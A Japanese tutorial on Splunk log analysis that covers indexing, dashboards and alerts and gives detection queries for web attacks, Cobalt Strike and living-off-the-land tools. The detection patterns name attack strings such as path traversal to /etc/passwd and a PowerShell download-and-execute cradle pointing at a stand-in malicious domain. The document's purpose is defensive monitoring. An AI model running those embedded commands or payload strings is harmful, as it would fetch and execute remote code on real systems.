# Splunkでのログ解析のやり方

Splunkは、機械データの収集、インデクシング、検索、可視化を行う強力なログ解析ツールです。Splunkを使用することで、大量のログデータから洞察を得ることができます。以下に、Splunkでのログ解析の基本的な手順と方法を説明します。

## 目次
1. [Splunkの概要](#splunkの概要)
2. [設定](#設定)
-  [データのインデクシング](#データのインデクシング)
-  [フィールドの抽出](#フィールドの抽出)
3. [データの検索](#データの検索)
- [Webサーバへの攻撃の検索](#Webサーバへの攻撃の検索)
-  [CobaltStrikeのログ検索](#CobaltStrikeのログ検索)
- [LOTL攻撃の検出](#LOTL攻撃の検出)
4. [ダッシュボードと可視化](#ダッシュボードと可視化)
5. [アラートの設定](#アラートの設定)
6. [レポートの作成](#レポートの作成)

## Splunkの概要

Splunkは、ログデータの収集、インデクシング、検索、分析、可視化を行うプラットフォームです。以下の主要な機能があります。
- **データのインデクシング**: 様々なデータソースからデータを取り込み、検索可能な形式に変換します。
- **検索とクエリ**: 検索クエリを使用して、必要な情報を迅速に取得できます。
- **可視化**: ダッシュボードやチャートを作成し、データを視覚的に分析します。
- **アラート**: 特定の条件に基づいてアラートを設定し、リアルタイムで通知を受け取ります。
## 設定
## データのインデクシング

Splunkにデータをインデックスすることで、検索や解析が可能になります。以下は、データのインデクシング方法です。

### 手順
1. **データソースの追加**:
   - Splunkのウェブインターフェースから**「Settings」** > **「Data Inputs」**を選択し、新しいデータソースを追加します。
   - ファイル、フォルダー、ネットワークソースなどからデータを取り込みます。

2. **データの設定**:
   - インデクシングするデータの種類に応じて、適切な設定を行います（例: ストレージパス、データ形式）。

3. **データのインデクシング**:
   - データがSplunkに取り込まれ、インデックスが作成されます。これにより、データの検索が可能になります。

### 例
```plaintext
# ファイルからデータをインデックスする例
/settings/data_inputs/filesystem/
```
---

 - ## Splunkでのインデックス作成手順

Splunkで新しいインデックスを作成するには、以下の手順に従います。

## 1. Splunkにログイン

Splunk Web UIに管理者としてログインします。

## 2. 設定メニューに移動

上部メニューから「**Settings（設定）**」をクリックします。

## 3. インデックスを選択

「**Data（データ）**」セクション内にある「**Indexes（インデックス）**」をクリックします。

## 4. 新しいインデックスを作成

インデックスの一覧ページが表示されるので、右上にある「**New Index（新しいインデックス）**」ボタンをクリックします。

## 5. インデックスの設定

「**New Index**」ページで以下の設定を行います：

- **Index Name（インデックス名）**: インデックスに名前を付けます。名前は一意である必要があります。
- **Index Data Type（データタイプ）**: `Events`または`Metrics`を選択します（通常は`Events`）。
- **Max Size（最大サイズ）**: インデックスの最大サイズを設定します。指定したサイズを超えると古いデータが削除されます。
- **Frozen Path（フローズンパス）**: （オプション）古いデータを別の場所にアーカイブする場合にパスを指定します。

## 6. インデックスの作成を保存

必要な設定を入力したら、ページ下部の「**Save（保存）**」ボタンをクリックしてインデックスを作成します。

## 7. インデックスの確認

インデックスを作成した後、再度「**Indexes**」ページに戻ると、新しく作成されたインデックスが一覧に表示されます。

---

## CLIでのインデックス作成

CLIを使用してインデックスを作成することも可能です。Splunkのインストールディレクトリに移動して、以下のコマンドを実行します。

```bash
splunk add index <index_name> -maxsize <size> -frozenTimePeriodInSecs <time_in_seconds>
```

例えば、最大サイズを10GBに設定し、フローズンデータの期間を30日（2592000秒）に設定する場合：

```bash
splunk add index proxy_logs -maxsize 10GB -frozenTimePeriodInSecs 2592000
```

---

## 注意事項

- インデックス名はユニークである必要があります。同じ名前を持つインデックスは作成できません。
- インデックスを作成する際に設定する最大サイズや保存期間は、システムの容量に合わせて慎重に決定してください。
- インデックスの管理には、Splunkの管理者権限が必要です。

## フィールドの抽出
### 例 送信元フィールドの設定
- ログを展開し、イベントアクションを押下
- フィールドの抽出をクリック
- 正規表現を選択し次へを押下
- 送信元IPを選択
- フィールド名を入力
- 設定
## データの検索

Splunkでは、検索クエリを使用してインデクシングされたデータを抽出し、分析します。

### 検索クエリの基本
- **検索**: 単純なキーワード検索を行います。
- **フィルタリング**: 時間範囲やフィールドでデータをフィルタリングします。
- **集計**: データを集計し、統計情報を生成します。

### 例
```spl
# 検索クエリの例
index="main" sourcetype="access_combined" status=404
```
---
### Webサーバへの攻撃の検索

#### 目次

1. [SQLインジェクション](#sqlインジェクション)
2. [PHPインジェクション](#phpインジェクション)
3. [クロスサイトスクリプティング（XSS）](#クロスサイトスクリプティングxss)
4. [SSRF（Server-Side Request Forgery）](#ssrf-server-side-request-forgery)
5. [OSコマンドインジェクション](#osコマンドインジェクション)
6. [ディレクトリトラバーサル](#ディレクトリトラバーサル)
7. [Remote Code Execution (RCE)](#remote-code-execution-rce)
8. [Local File Inclusion (LFI)](#local-file-inclusion-lfi)

#### SQLインジェクション

```bash
index=web_logs sourcetype=access_combined
("union select" OR "select * from" OR "or 1=1" OR "drop table" OR "and 1=1")
| stats count by src_ip, uri
```

#### PHPインジェクション

```bash
index=web_logs sourcetype=access_combined
("php://input" OR "php://filter" OR "eval(" OR "system(")
| stats count by src_ip, uri
```

#### クロスサイトスクリプティング（XSS）

```bash
index=web_logs sourcetype=access_combined
("<script>" OR "javascript:" OR "onerror=" OR "alert(")
| stats count by src_ip, uri
```

#### SSRF（Server-Side Request Forgery）

```bash
index=web_logs sourcetype=access_combined
("http://localhost" OR "http://127.0.0.1" OR "http://metadata")
| stats count by src_ip, uri
```

#### OSコマンドインジェクション

```bash
index=web_logs sourcetype=access_combined
("| ls" OR "| cat" OR "| whoami" OR "| id")
| stats count by src_ip, uri
```

#### ディレクトリトラバーサル

```bash
index=web_logs sourcetype=access_combined
("../../../" OR "..%2F" OR "..\\")
| stats count by src_ip, uri
```

#### Remote Code Execution (RCE)

```bash
index=web_logs sourcetype=access_combined
("system(" OR "exec(" OR "shell_exec(" OR "passthru(" OR "popen(")
| stats count by src_ip, uri
```

#### Local File Inclusion (LFI)

```bash
index=web_logs sourcetype=access_combined
("../../../etc/passwd" OR "....//....//....//etc/passwd" OR "php://filter/read=convert.base64-encode/resource=")
| stats count by src_ip, uri
```
---
## CobaltStrikeのログ検索

### 1. **Cobalt Strikeの一般的な特徴**

Cobalt Strikeのアクティビティは以下のような特徴があります：
- **特定のポート**: デフォルトでポート`50050`を使用することが多い。
- **HTTP/HTTPSトンネリング**: Cobalt StrikeはHTTP/HTTPSでトンネリングすることがある。
- **DNSトンネリング**: Cobalt StrikeのC2サーバーがDNSリクエストを使う場合もある。

### 2. **特定のポートによる検索**

Cobalt Strikeが使用する可能性のあるポート（例: `50050`）でトラフィックを検索します。

**例**: ポート`50050`を使用しているトラフィックを検索する

```plaintext
index=network_logs | search dest_port=50050
```
```bash
index=squid_logs sourcetype=squid_access dest_port=80 OR dest_port=443
| stats count by src_ip dst_ip
| sort - count
```
### 3. **HTTP/HTTPSトンネリングの検出**

Cobalt StrikeはHTTP/HTTPSで通信することがあるため、異常な`User-Agent`や特定のURIパスを探します。

**例**: 特定の`User-Agent`を持つHTTPリクエストを検索する

```plaintext
index=web_logs | search "User-Agent=CobaltStrike"
```

**例**: 特定のURIパスが含まれるリクエストを検索する

```plaintext
index=web_logs | search uri_path="/path/to/command"
```

### 4. **DNSトンネリングの検出**

Cobalt StrikeがDNSトンネリングを使用する場合、特定のドメインや長いサブドメインを探します。

**例**: 特定のドメインを含むDNSクエリを検索する

```plaintext
index=dns_logs | search query="*.maliciousdomain.com"
```

**例**: 異常に長いDNSクエリを検索する

```plaintext
index=dns_logs | search length(query) > 50
```

### 5. **異常なアクセス数及びデータ転送量の検出**

異常なアクセス数
```bash
index = * src_ip = プロキシIP | stats count by src_ip dest_ip |sort -
 count
```
```bash
index = * dest_ip = プロキシIP | stats count by src_ip dest | sort - count
```
Cobalt Strikeのセッションは異常なデータ転送量を示すことがあります。

**例**: 大量のデータ転送が行われているセッションを検索する

```plaintext
index=network_logs | stats sum(bytes) by src_ip, dest_ip | where sum(bytes) > 1000000
```

### 6. **コマンドやアクティビティの検出**

Cobalt Strikeが実行するコマンドやアクティビティを検出するために、ログに記録されたコマンドを検索します。

**例**: 特定のコマンドが含まれるログを検索する

```plaintext
index=sysmon_logs | search "cmdline=\"powershell -nop -w hidden -c iex (New-Object Net.WebClient).DownloadString('http://maliciousdomain.com/payload')\""
```

Cobalt Strikeのイベントログ検索

1. Sysmonログでの検出

Sysmon（System Monitor）は、Windowsイベントログを詳細に記録するツールで、Cobalt Strikeのアクティビティを検出するのに役立ちます。

1.1 PowerShellコマンドの監視

Cobalt StrikeはPowerShellコマンドを実行することがあります。SysmonイベントID1（プロセス作成イベント）でPowerShellコマンドを監視します。

例: PowerShellコマンドラインにiex（Invoke-Expression）が含まれるイベントを検索する
```bash
index=sysmon_logs sourcetype=XmlWinEventLog:Microsoft-Windows-Sysmon/Operational EventCode=1 | search CommandLine="iex*"
```
1.2 ネットワーク接続の監視

SysmonイベントID3（ネットワーク接続イベント）でCobalt StrikeのC2トラフィックを検出します。

例: 特定のポートへのネットワーク接続を検索する
```bash
index=sysmon_logs sourcetype=XmlWinEventLog:Microsoft-Windows-Sysmon/Operational EventCode=3 | search DestinationPort=50050
```
1.3 ファイル作成イベントの監視

SysmonイベントID11（ファイル作成イベント）で、Cobalt Strikeのペイロードやマルウェアファイルの作成を検出します。

例: 特定のファイルパスに関連するイベントを検索する
```bash
index=sysmon_logs sourcetype=XmlWinEventLog:Microsoft-Windows-Sysmon/Operational EventCode=11 | search FileName="*.exe"
```
2. Windowsイベントログでの検出

Windowsイベントログでも、Cobalt Strikeの活動に関連する情報を検索できます。

2.1 イベントID4688（プロセス作成）

新しく作成されたプロセスを監視します。

例: 特定のコマンドラインオプションを含むプロセス作成イベントを検索する
```bash
index=windows_logs sourcetype=WinEventLog:Security EventCode=4688 | search CommandLine="powershell*"
```
2.2 イベントID5156（ネットワーク接続の許可）

ネットワーク接続に関する情報を確認します。

例: 特定のポートへの接続を検索する
```bash
index=windows_logs sourcetype=WinEventLog:Security EventCode=5156 | search DestinationPort=50050
```
3. カスタムフィルタリングとアラート

特定の条件に基づいてアラートを設定し、Cobalt Strikeのアクティビティをリアルタイムで監視します。

3.1 高データ転送量の監視

Cobalt Strikeは大量のデータを転送することがあるため、大量のデータ転送を検出します。

例: 特定のIPアドレス間での大容量データ転送を監視する
```bash
index=network_logs | stats sum(bytes) by src_ip, dest_ip | where sum(bytes) > 1000000
```
3.2 定期的なDNSリクエストの監視

Cobalt StrikeのC2サーバーがDNSトンネリングを使用する場合があります。

例: 短時間で多数のDNSリクエストを検索する
```bash
index=dns_logs | timechart span=1m count by query | where count > 100
```

# LOTL攻撃の検出

## PowerShellを使用したLOTL攻撃の検出

PowerShellを使用したコマンド実行や、スクリプトのロードに関連するイベントを検出します。

```spl
index=your_index sourcetype=your_sourcetype (powershell OR "Invoke-Expression" OR "IEX" OR "Invoke-WebRequest")
| table _time host user parent_process_name process_name process_id command_line
```

## Windows Management Instrumentation (WMI)を使用したLOTL攻撃の検出

WMIを利用したプロセスの起動を検出します。

```spl
index=your_index sourcetype=your_sourcetype EventCode=4688 (process_name="wmic.exe" OR command_line="*wmic*")
| table _time host user process_id parent_process_name command_line
```

## Windows Scripting Host (WSH)を使用したLOTL攻撃の検出

WSHを使用したスクリプトの実行を検出します。

```spl
index=your_index sourcetype=your_sourcetype (process_name="cscript.exe" OR process_name="wscript.exe")
| table _time host user process_name process_id parent_process_name command_line
```

## Regsvr32を使用したLOTL攻撃の検出

Regsvr32を使用してマルウェアを実行する攻撃を検出します。

```spl
index=your_index sourcetype=your_sourcetype process_name="regsvr32.exe"
| table _time host user process_name process_id parent_process_name command_line
```

## rundll32を使用したLOTL攻撃の検出

rundll32を利用したDLLの実行を検出します。

```spl
index=your_index sourcetype=your_sourcetype process_name="rundll32.exe"
| table _time host user process_name process_id parent_process_name command_line
```

## Bitsadminを使用したLOTL攻撃の検出

Bitsadminを利用したファイルのダウンロードやジョブの作成を検出します。

```spl
index=your_index sourcetype=your_sourcetype process_name="bitsadmin.exe"
| table _time host user process_name process_id parent_process_name command_line
```

---



---
## ダッシュボードと可視化

Splunkでは、検索結果をダッシュボードやチャートで可視化し、データの洞察を得ることができます。

### 手順
1. **ダッシュボードの作成**:
   - **「Dashboards」**セクションから新しいダッシュボードを作成します。
   - 各パネルに検索クエリや可視化を追加します。

2. **可視化の設定**:
   - グラフ、チャート、テーブルなど、適切な可視化形式を選択します。
   - ダッシュボードのレイアウトやデザインをカスタマイズします。

### 例
```spl
# 例: トラフィックの時間帯別分布を可視化するクエリ
index="web" | timechart count by status
```

## アラートの設定

Splunkでアラートを設定することで、特定の条件に基づいた通知を受け取ることができます。

### 手順
1. **アラートの作成**:
   - **「Alerts」**セクションから新しいアラートを作成します。
   - 条件（例: 特定の検索クエリやしきい値）を設定します。

2. **アラートアクションの設定**:
   - アラートがトリガーされたときに実行されるアクション（例: メール通知、Webhook）を設定します。

### 例
```spl
# 例: 404エラーが100件を超えた場合にアラートをトリガー
index="main" sourcetype="access_combined" status=404 | stats count | where count > 100
```

## レポートの作成

Splunkでは、検索結果をレポートとして保存し、定期的に生成することができます。

### 手順
1. **レポートの作成**:
   - **「Reports」**セクションから新しいレポートを作成します。
   - 検索クエリとレポートの形式を設定します。

2. **スケジュールの設定**:
   - レポートの生成スケジュールを設定し、定期的に自動生成させます。

### 例
```spl
# 例: トラフィックの月別レポート
index="web" | timechart span=1mon count
```

## まとめ

Splunkを使用することで、ログデータの収集、インデクシング、検索、可視化、アラート設定、レポート作成が効率的に行えます。これにより、システムの監視やセキュリティインシデントの分析を迅速に行うことができます。
